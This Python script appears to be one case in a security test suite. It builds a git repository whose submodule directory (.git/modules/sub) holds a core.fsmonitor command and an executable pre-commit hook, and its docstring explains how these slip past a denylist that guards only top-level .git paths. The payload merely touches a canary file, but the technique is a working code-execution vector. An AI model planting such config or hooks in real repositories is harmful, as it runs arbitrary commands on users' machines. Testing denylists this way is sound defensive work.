"""A7: the RCE moved into a submodule's GIT_DIR.

A submodule does not carry a ``.git`` directory of its own — its GIT_DIR
lives at ``.git/modules/<name>/``, holding that submodule's own ``config``
and ``hooks/``. Git reads and executes them exactly as it does the top-level
ones, the moment any command runs inside the submodule.

So the same ``core.fsmonitor`` payload is served twice over: once at
``.git/modules/sub/config`` and once as ``.git/modules/sub/hooks/pre-commit``.
Both are outside a denylist that only recognises a ``.git`` component
directly above the file — and unlike A6, nothing here depends on the
filesystem being case-insensitive. The bypass holds on every platform.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from _payload_lib import build_minimal_repo, config_with  # noqa: E402

GITMODULES = """[submodule "sub"]
\tpath = sub
\turl = ./sub
"""

HOOK = """#!/bin/sh
touch /canary/PWNED_A7
"""


def main() -> None:
    payload = HERE / 'payload'
    # Top-level config is clean, so a tool that guards only `.git/config`
    # believes it has done its job.
    build_minimal_repo(
        payload,
        config=config_with(''),
        extra_files={'.gitmodules': GITMODULES.encode()},
    )

    module_dir = payload / '.git' / 'modules' / 'sub'
    (module_dir / 'hooks').mkdir(parents=True, exist_ok=True)
    (module_dir / 'config').write_text(
        config_with('\tfsmonitor = "touch /canary/PWNED_A7; false"\n'),
    )
    (module_dir / 'HEAD').write_text('ref: refs/heads/main\n')
    hook = module_dir / 'hooks' / 'pre-commit'
    hook.write_text(HOOK)
    hook.chmod(0o755)
    print(f'Built A7 payload at {payload}')


if __name__ == '__main__':
    main()
